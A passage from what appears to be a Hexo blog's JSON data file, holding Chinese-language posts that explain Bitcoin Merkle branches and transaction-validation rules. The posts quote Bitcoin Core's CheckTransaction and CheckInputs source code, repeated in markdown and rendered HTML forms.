class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>获取<a href=\"https://github.com/trottier/original-bitcoin/blob/92ee8d9a994391d148733da77e2bbc2f4acc43cd/src/main.h#L887\" target=\"_blank\" rel=\"noopener\">Merkle树分支</a>的代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vector&lt;uint256&gt; GetMerkleBranch(int nIndex) const</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t    // 判断MerkleTree是否为空，若为空，则重新构建</span><br><span class=\"line\">\tif (vMerkleTree.empty())</span><br><span class=\"line\">\t  BuildMerkleTree();</span><br><span class=\"line\">\t// vMerkleBranch用来保存分支数据</span><br><span class=\"line\">\tvector&lt;uint256&gt; vMerkleBranch;</span><br><span class=\"line\">\tint j = 0;</span><br><span class=\"line\">\t// 填充分支数据</span><br><span class=\"line\">\tfor (int nSize = vtx.size(); nSize &gt; 1; nSize = (nSize + 1) / 2)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint i = min(nIndex^1, nSize-1);</span><br><span class=\"line\">\t\tvMerkleBranch.push_back(vMerkleTree[j+i]);</span><br><span class=\"line\">\t\tnIndex &gt;&gt;= 1;</span><br><span class=\"line\">\t\tj += nSize;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn vMerkleBranch;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"比特币挖矿之交易校验","comments":0,"date":"2018-03-09T03:16:06.000Z","img":null,"_content":"在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中我们提到矿工的任务之一是监听交易广播，验证交易是否有效，但是没有具体的说明校验规则，在本文中我们将对交易的校验规则进行具体介绍。\n\n## 交易校验\n每一个独立节点在校验每一笔接收到的交易时，都遵循如下标准：\n1、交易的语法和数据结构必须正确\n2、交易的字节大小在限制范围内\n3、每一个输出值，必须在规定的范围内\n4、没有哈希等于0，N等于-1的输入\n5、锁定时间在限制范围内\n6、交易的字节大小不小于100\n7、交易中的签名不大于签名操作的上限\n8、解锁脚本，锁定脚本格式规范\n9、池中或位于主分支区块中的一个匹配交易必须是存在的\n10、对于每一个输入，如果引用的输出存在于池中任何的交易，该交易将被拒绝\n11、对于每一个输入，在主分支和交易池中寻找引用的输出交易。如果输出交易缺少任何一个输入，该交易将成为一个孤立的交易。如果与其匹配的交易还没有出现在池中，那么将被加入孤儿交易池\n12、对于每一个输入，如果引用的输出交易是一个coinbase输出，该输入需要等待100个确认才能生效\n13、对于每一个输入，引用的输出必须是存在的，并且没有被花费\n14、使用引用的输出交易获得输入值，并检查每一个输入值和总值是否在规定值的范围内\n15、如果输入值的总和小于输出值的总和，交易将被中止\n16、如果交易费用太低以至于无法进入一个空的区块，交易将被拒绝\n17、每一个输入的解锁脚本必须一句相应的锁定脚本来验证\n\n以上的校验标准主要在比特币核心客户端[CheckTransaction](https://github.com/bitcoin/bitcoin/blob/3c098a8aa0780009c11b66b1a5d488a928629ebf/src/consensus/tx_verify.cpp#L159)函数中获得，具体源码实现如下：\n```\nbool CheckTransaction(const CTransaction& tx, CValidationState &state, bool fCheckDuplicateInputs)\n{\n    // 不依赖于上下文的基础性检查\n    // 校验输入是否为空，每笔交易都需有来源\n    if (tx.vin.empty())\n        return state.DoS(10, false, REJECT_INVALID, \"bad-txns-vin-empty\");\n    // 校验输出是否为空，每笔钱都应有去向\n    if (tx.vout.empty())\n        return state.DoS(10, false, REJECT_INVALID, \"bad-txns-vout-empty\");\n    // 大小校验 不考虑隔离见证数据\n    if (::GetSerializeSize(tx, SER_NETWORK, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT)\n        return state.DoS(100, false, REJECT_INVALID, \"bad-txns-oversize\");\n\n    // 校验输出值是否有效\n    CAmount nValueOut = 0;\n    for (const auto& txout : tx.vout)\n    {\n        if (txout.nValue < 0)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-vout-negative\");\n        if (txout.nValue > MAX_MONEY)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-vout-toolarge\");\n        nValueOut += txout.nValue;\n        if (!MoneyRange(nValueOut))\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-txouttotal-toolarge\");\n    }\n\n    // 校验重复输入 注意该校验比较耗时，所以我们在CheckBlock时，跳过该步骤\n    if (fCheckDuplicateInputs) {\n        std::set<COutPoint> vInOutPoints;\n        for (const auto& txin : tx.vin)\n        {\n            if (!vInOutPoints.insert(txin.prevout).second)\n                return state.DoS(100, false, REJECT_INVALID, \"bad-txns-inputs-duplicate\");\n        }\n    }\n\n    // 对coinbase交易进行校验\n    if (tx.IsCoinBase())\n    {\n        // 检验coinbase的scriptSig大小是否在[2,100]范围内\n        if (tx.vin[0].scriptSig.size() < 2 || tx.vin[0].scriptSig.size() > 100)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-cb-length\");\n    }\n    else\n    {\n        for (const auto& txin : tx.vin)\n            // 每笔交易必须有来源\n            if (txin.prevout.IsNull())\n                return state.DoS(10, false, REJECT_INVALID, \"bad-txns-prevout-null\");\n    }\n\n    return true;\n}\n```\n[校验输入](https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L1351)\n```\n// 检查指定交易的所有输入是否有效（不存在双花）\nbool CheckInputs(const CTransaction& tx, CValidationState &state, const CCoinsViewCache &inputs, bool fScriptChecks, unsigned int flags, bool cacheSigStore, bool cacheFullScriptStore, PrecomputedTransactionData& txdata, std::vector<CScriptCheck> *pvChecks)\n{\n    if (!tx.IsCoinBase())\n    {\n        if (pvChecks)\n            pvChecks->reserve(tx.vin.size());\n\n        if (fScriptChecks) {\n            uint256 hashCacheEntry;\n            static_assert(55 - sizeof(flags) - 32 >= 128/8, \"Want at least 128 bits of nonce for script execution cache\");\n            CSHA256().Write(scriptExecutionCacheNonce.begin(), 55 - sizeof(flags) - 32).Write(tx.GetWitnessHash().begin(), 32).Write((unsigned char*)&flags, sizeof(flags)).Finalize(hashCacheEntry.begin());\n            AssertLockHeld(cs_main);\n            if (scriptExecutionCache.contains(hashCacheEntry, !cacheFullScriptStore)) {\n                return true;\n            } \n\n            for (unsigned int i = 0; i < tx.vin.size(); i++) {\n                const COutPoint &prevout = tx.vin[i].prevout;\n                const Coin& coin = inputs.AccessCoin(prevout);\n                assert(!coin.IsSpent());\n\n                CScriptCheck check(coin.out, tx, i, flags, cacheSigStore, &txdata);\n                if (pvChecks) {\n                    pvChecks->push_back(CScriptCheck());\n                    check.swap(pvChecks->back());\n                } else if (!check()) {\n                    if (flags & STANDARD_NOT_MANDATORY_VERIFY_FLAGS) {\n                         CScriptCheck check2(coin.out, tx, i, flags & ~STANDARD_NOT_MANDATORY_VERIFY_FLAGS, cacheSigStore, &txdata);\n                    if (check2())\n                        return state.Invalid(false, REJECT_NONSTANDARD, strprintf(\"non-mandatory-script-verify-flag (%s)\", ScriptErrorString(check.GetScriptError())));\n                }\n\n                return state.DoS(100,false, REJECT_INVALID, strprintf(\"mandatory-script-verify-flag-failed (%s)\", ScriptErrorString(check.GetScriptError())));\n            }\n        }\n        if (cacheFullScriptStore && !pvChecks) {\n            scriptExecutionCache.insert(hashCacheEntry);\n        }\n    }\n    \n    return true;\n}\n```\n","source":"_posts/比特币挖矿之交易校验.md","raw":"---\ntitle: 比特币挖矿之交易校验\ncomments: false\ndate: 2018-03-09 11:16:06\ncategories: 矿池\ntags:\n- LeonBCK\n- 比特币\n- 矿池\nimg:\n---\n在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/)中我们提到矿工的任务之一是监听交易广播，验证交易是否有效，但是没有具体的说明校验规则，在本文中我们将对交易的校验规则进行具体介绍。\n\n## 交易校验\n每一个独立节点在校验每一笔接收到的交易时，都遵循如下标准：\n1、交易的语法和数据结构必须正确\n2、交易的字节大小在限制范围内\n3、每一个输出值，必须在规定的范围内\n4、没有哈希等于0，N等于-1的输入\n5、锁定时间在限制范围内\n6、交易的字节大小不小于100\n7、交易中的签名不大于签名操作的上限\n8、解锁脚本，锁定脚本格式规范\n9、池中或位于主分支区块中的一个匹配交易必须是存在的\n10、对于每一个输入，如果引用的输出存在于池中任何的交易，该交易将被拒绝\n11、对于每一个输入，在主分支和交易池中寻找引用的输出交易。如果输出交易缺少任何一个输入，该交易将成为一个孤立的交易。如果与其匹配的交易还没有出现在池中，那么将被加入孤儿交易池\n12、对于每一个输入，如果引用的输出交易是一个coinbase输出，该输入需要等待100个确认才能生效\n13、对于每一个输入，引用的输出必须是存在的，并且没有被花费\n14、使用引用的输出交易获得输入值，并检查每一个输入值和总值是否在规定值的范围内\n15、如果输入值的总和小于输出值的总和，交易将被中止\n16、如果交易费用太低以至于无法进入一个空的区块，交易将被拒绝\n17、每一个输入的解锁脚本必须一句相应的锁定脚本来验证\n\n以上的校验标准主要在比特币核心客户端[CheckTransaction](https://github.com/bitcoin/bitcoin/blob/3c098a8aa0780009c11b66b1a5d488a928629ebf/src/consensus/tx_verify.cpp#L159)函数中获得，具体源码实现如下：\n```\nbool CheckTransaction(const CTransaction& tx, CValidationState &state, bool fCheckDuplicateInputs)\n{\n    // 不依赖于上下文的基础性检查\n    // 校验输入是否为空，每笔交易都需有来源\n    if (tx.vin.empty())\n        return state.DoS(10, false, REJECT_INVALID, \"bad-txns-vin-empty\");\n    // 校验输出是否为空，每笔钱都应有去向\n    if (tx.vout.empty())\n        return state.DoS(10, false, REJECT_INVALID, \"bad-txns-vout-empty\");\n    // 大小校验 不考虑隔离见证数据\n    if (::GetSerializeSize(tx, SER_NETWORK, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR > MAX_BLOCK_WEIGHT)\n        return state.DoS(100, false, REJECT_INVALID, \"bad-txns-oversize\");\n\n    // 校验输出值是否有效\n    CAmount nValueOut = 0;\n    for (const auto& txout : tx.vout)\n    {\n        if (txout.nValue < 0)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-vout-negative\");\n        if (txout.nValue > MAX_MONEY)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-vout-toolarge\");\n        nValueOut += txout.nValue;\n        if (!MoneyRange(nValueOut))\n            return state.DoS(100, false, REJECT_INVALID, \"bad-txns-txouttotal-toolarge\");\n    }\n\n    // 校验重复输入 注意该校验比较耗时，所以我们在CheckBlock时，跳过该步骤\n    if (fCheckDuplicateInputs) {\n        std::set<COutPoint> vInOutPoints;\n        for (const auto& txin : tx.vin)\n        {\n            if (!vInOutPoints.insert(txin.prevout).second)\n                return state.DoS(100, false, REJECT_INVALID, \"bad-txns-inputs-duplicate\");\n        }\n    }\n\n    // 对coinbase交易进行校验\n    if (tx.IsCoinBase())\n    {\n        // 检验coinbase的scriptSig大小是否在[2,100]范围内\n        if (tx.vin[0].scriptSig.size() < 2 || tx.vin[0].scriptSig.size() > 100)\n            return state.DoS(100, false, REJECT_INVALID, \"bad-cb-length\");\n    }\n    else\n    {\n        for (const auto& txin : tx.vin)\n            // 每笔交易必须有来源\n            if (txin.prevout.IsNull())\n                return state.DoS(10, false, REJECT_INVALID, \"bad-txns-prevout-null\");\n    }\n\n    return true;\n}\n```\n[校验输入](https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L1351)\n```\n// 检查指定交易的所有输入是否有效（不存在双花）\nbool CheckInputs(const CTransaction& tx, CValidationState &state, const CCoinsViewCache &inputs, bool fScriptChecks, unsigned int flags, bool cacheSigStore, bool cacheFullScriptStore, PrecomputedTransactionData& txdata, std::vector<CScriptCheck> *pvChecks)\n{\n    if (!tx.IsCoinBase())\n    {\n        if (pvChecks)\n            pvChecks->reserve(tx.vin.size());\n\n        if (fScriptChecks) {\n            uint256 hashCacheEntry;\n            static_assert(55 - sizeof(flags) - 32 >= 128/8, \"Want at least 128 bits of nonce for script execution cache\");\n            CSHA256().Write(scriptExecutionCacheNonce.begin(), 55 - sizeof(flags) - 32).Write(tx.GetWitnessHash().begin(), 32).Write((unsigned char*)&flags, sizeof(flags)).Finalize(hashCacheEntry.begin());\n            AssertLockHeld(cs_main);\n            if (scriptExecutionCache.contains(hashCacheEntry, !cacheFullScriptStore)) {\n                return true;\n            } \n\n            for (unsigned int i = 0; i < tx.vin.size(); i++) {\n                const COutPoint &prevout = tx.vin[i].prevout;\n                const Coin& coin = inputs.AccessCoin(prevout);\n                assert(!coin.IsSpent());\n\n                CScriptCheck check(coin.out, tx, i, flags, cacheSigStore, &txdata);\n                if (pvChecks) {\n                    pvChecks->push_back(CScriptCheck());\n                    check.swap(pvChecks->back());\n                } else if (!check()) {\n                    if (flags & STANDARD_NOT_MANDATORY_VERIFY_FLAGS) {\n                         CScriptCheck check2(coin.out, tx, i, flags & ~STANDARD_NOT_MANDATORY_VERIFY_FLAGS, cacheSigStore, &txdata);\n                    if (check2())\n                        return state.Invalid(false, REJECT_NONSTANDARD, strprintf(\"non-mandatory-script-verify-flag (%s)\", ScriptErrorString(check.GetScriptError())));\n                }\n\n                return state.DoS(100,false, REJECT_INVALID, strprintf(\"mandatory-script-verify-flag-failed (%s)\", ScriptErrorString(check.GetScriptError())));\n            }\n        }\n        if (cacheFullScriptStore && !pvChecks) {\n            scriptExecutionCache.insert(hashCacheEntry);\n        }\n    }\n    \n    return true;\n}\n```\n","slug":"比特币挖矿之交易校验","published":1,"updated":"2018-03-09T09:25:39.979Z","layout":"post","photos":[],"link":"","_id":"cjf7piaw1001opkwop3p3p6po","content":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到矿工的任务之一是监听交易广播，验证交易是否有效，但是没有具体的说明校验规则，在本文中我们将对交易的校验规则进行具体介绍。</p>\n<h2 id=\"交易校验\"><a href=\"#交易校验\" class=\"headerlink\" title=\"交易校验\"></a>交易校验</h2><p>每一个独立节点在校验每一笔接收到的交易时，都遵循如下标准：<br>1、交易的语法和数据结构必须正确<br>2、交易的字节大小在限制范围内<br>3、每一个输出值，必须在规定的范围内<br>4、没有哈希等于0，N等于-1的输入<br>5、锁定时间在限制范围内<br>6、交易的字节大小不小于100<br>7、交易中的签名不大于签名操作的上限<br>8、解锁脚本，锁定脚本格式规范<br>9、池中或位于主分支区块中的一个匹配交易必须是存在的<br>10、对于每一个输入，如果引用的输出存在于池中任何的交易，该交易将被拒绝<br>11、对于每一个输入，在主分支和交易池中寻找引用的输出交易。如果输出交易缺少任何一个输入，该交易将成为一个孤立的交易。如果与其匹配的交易还没有出现在池中，那么将被加入孤儿交易池<br>12、对于每一个输入，如果引用的输出交易是一个coinbase输出，该输入需要等待100个确认才能生效<br>13、对于每一个输入，引用的输出必须是存在的，并且没有被花费<br>14、使用引用的输出交易获得输入值，并检查每一个输入值和总值是否在规定值的范围内<br>15、如果输入值的总和小于输出值的总和，交易将被中止<br>16、如果交易费用太低以至于无法进入一个空的区块，交易将被拒绝<br>17、每一个输入的解锁脚本必须一句相应的锁定脚本来验证</p>\n<p>以上的校验标准主要在比特币核心客户端<a href=\"https://github.com/bitcoin/bitcoin/blob/3c098a8aa0780009c11b66b1a5d488a928629ebf/src/consensus/tx_verify.cpp#L159\" target=\"_blank\" rel=\"noopener\">CheckTransaction</a>函数中获得，具体源码实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckTransaction(const CTransaction&amp; tx, CValidationState &amp;state, bool fCheckDuplicateInputs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // 不依赖于上下文的基础性检查</span><br><span class=\"line\">    // 校验输入是否为空，每笔交易都需有来源</span><br><span class=\"line\">    if (tx.vin.empty())</span><br><span class=\"line\">        return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vin-empty&quot;);</span><br><span class=\"line\">    // 校验输出是否为空，每笔钱都应有去向</span><br><span class=\"line\">    if (tx.vout.empty())</span><br><span class=\"line\">        return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vout-empty&quot;);</span><br><span class=\"line\">    // 大小校验 不考虑隔离见证数据</span><br><span class=\"line\">    if (::GetSerializeSize(tx, SER_NETWORK, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-oversize&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 校验输出值是否有效</span><br><span class=\"line\">    CAmount nValueOut = 0;</span><br><span class=\"line\">    for (const auto&amp; txout : tx.vout)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (txout.nValue &lt; 0)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-negative&quot;);</span><br><span class=\"line\">        if (txout.nValue &gt; MAX_MONEY)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-toolarge&quot;);</span><br><span class=\"line\">        nValueOut += txout.nValue;</span><br><span class=\"line\">        if (!MoneyRange(nValueOut))</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-txouttotal-toolarge&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 校验重复输入 注意该校验比较耗时，所以我们在CheckBlock时，跳过该步骤</span><br><span class=\"line\">    if (fCheckDuplicateInputs) &#123;</span><br><span class=\"line\">        std::set&lt;COutPoint&gt; vInOutPoints;</span><br><span class=\"line\">        for (const auto&amp; txin : tx.vin)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if (!vInOutPoints.insert(txin.prevout).second)</span><br><span class=\"line\">                return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-inputs-duplicate&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 对coinbase交易进行校验</span><br><span class=\"line\">    if (tx.IsCoinBase())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        // 检验coinbase的scriptSig大小是否在[2,100]范围内</span><br><span class=\"line\">        if (tx.vin[0].scriptSig.size() &lt; 2 || tx.vin[0].scriptSig.size() &gt; 100)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-length&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        for (const auto&amp; txin : tx.vin)</span><br><span class=\"line\">            // 每笔交易必须有来源</span><br><span class=\"line\">            if (txin.prevout.IsNull())</span><br><span class=\"line\">                return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-prevout-null&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L1351\" target=\"_blank\" rel=\"noopener\">校验输入</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检查指定交易的所有输入是否有效（不存在双花）</span><br><span class=\"line\">bool CheckInputs(const CTransaction&amp; tx, CValidationState &amp;state, const CCoinsViewCache &amp;inputs, bool fScriptChecks, unsigned int flags, bool cacheSigStore, bool cacheFullScriptStore, PrecomputedTransactionData&amp; txdata, std::vector&lt;CScriptCheck&gt; *pvChecks)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!tx.IsCoinBase())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (pvChecks)</span><br><span class=\"line\">            pvChecks-&gt;reserve(tx.vin.size());</span><br><span class=\"line\"></span><br><span class=\"line\">        if (fScriptChecks) &#123;</span><br><span class=\"line\">            uint256 hashCacheEntry;</span><br><span class=\"line\">            static_assert(55 - sizeof(flags) - 32 &gt;= 128/8, &quot;Want at least 128 bits of nonce for script execution cache&quot;);</span><br><span class=\"line\">            CSHA256().Write(scriptExecutionCacheNonce.begin(), 55 - sizeof(flags) - 32).Write(tx.GetWitnessHash().begin(), 32).Write((unsigned char*)&amp;flags, sizeof(flags)).Finalize(hashCacheEntry.begin());</span><br><span class=\"line\">            AssertLockHeld(cs_main);</span><br><span class=\"line\">            if (scriptExecutionCache.contains(hashCacheEntry, !cacheFullScriptStore)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">            for (unsigned int i = 0; i &lt; tx.vin.size(); i++) &#123;</span><br><span class=\"line\">                const COutPoint &amp;prevout = tx.vin[i].prevout;</span><br><span class=\"line\">                const Coin&amp; coin = inputs.AccessCoin(prevout);</span><br><span class=\"line\">                assert(!coin.IsSpent());</span><br><span class=\"line\"></span><br><span class=\"line\">                CScriptCheck check(coin.out, tx, i, flags, cacheSigStore, &amp;txdata);</span><br><span class=\"line\">                if (pvChecks) &#123;</span><br><span class=\"line\">                    pvChecks-&gt;push_back(CScriptCheck());</span><br><span class=\"line\">                    check.swap(pvChecks-&gt;back());</span><br><span class=\"line\">                &#125; else if (!check()) &#123;</span><br><span class=\"line\">                    if (flags &amp; STANDARD_NOT_MANDATORY_VERIFY_FLAGS) &#123;</span><br><span class=\"line\">                         CScriptCheck check2(coin.out, tx, i, flags &amp; ~STANDARD_NOT_MANDATORY_VERIFY_FLAGS, cacheSigStore, &amp;txdata);</span><br><span class=\"line\">                    if (check2())</span><br><span class=\"line\">                        return state.Invalid(false, REJECT_NONSTANDARD, strprintf(&quot;non-mandatory-script-verify-flag (%s)&quot;, ScriptErrorString(check.GetScriptError())));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                return state.DoS(100,false, REJECT_INVALID, strprintf(&quot;mandatory-script-verify-flag-failed (%s)&quot;, ScriptErrorString(check.GetScriptError())));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (cacheFullScriptStore &amp;&amp; !pvChecks) &#123;</span><br><span class=\"line\">            scriptExecutionCache.insert(hashCacheEntry);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在<a href=\"http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1-1/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之矿工任务</a>中我们提到矿工的任务之一是监听交易广播，验证交易是否有效，但是没有具体的说明校验规则，在本文中我们将对交易的校验规则进行具体介绍。</p>\n<h2 id=\"交易校验\"><a href=\"#交易校验\" class=\"headerlink\" title=\"交易校验\"></a>交易校验</h2><p>每一个独立节点在校验每一笔接收到的交易时，都遵循如下标准：<br>1、交易的语法和数据结构必须正确<br>2、交易的字节大小在限制范围内<br>3、每一个输出值，必须在规定的范围内<br>4、没有哈希等于0，N等于-1的输入<br>5、锁定时间在限制范围内<br>6、交易的字节大小不小于100<br>7、交易中的签名不大于签名操作的上限<br>8、解锁脚本，锁定脚本格式规范<br>9、池中或位于主分支区块中的一个匹配交易必须是存在的<br>10、对于每一个输入，如果引用的输出存在于池中任何的交易，该交易将被拒绝<br>11、对于每一个输入，在主分支和交易池中寻找引用的输出交易。如果输出交易缺少任何一个输入，该交易将成为一个孤立的交易。如果与其匹配的交易还没有出现在池中，那么将被加入孤儿交易池<br>12、对于每一个输入，如果引用的输出交易是一个coinbase输出，该输入需要等待100个确认才能生效<br>13、对于每一个输入，引用的输出必须是存在的，并且没有被花费<br>14、使用引用的输出交易获得输入值，并检查每一个输入值和总值是否在规定值的范围内<br>15、如果输入值的总和小于输出值的总和，交易将被中止<br>16、如果交易费用太低以至于无法进入一个空的区块，交易将被拒绝<br>17、每一个输入的解锁脚本必须一句相应的锁定脚本来验证</p>\n<p>以上的校验标准主要在比特币核心客户端<a href=\"https://github.com/bitcoin/bitcoin/blob/3c098a8aa0780009c11b66b1a5d488a928629ebf/src/consensus/tx_verify.cpp#L159\" target=\"_blank\" rel=\"noopener\">CheckTransaction</a>函数中获得，具体源码实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span 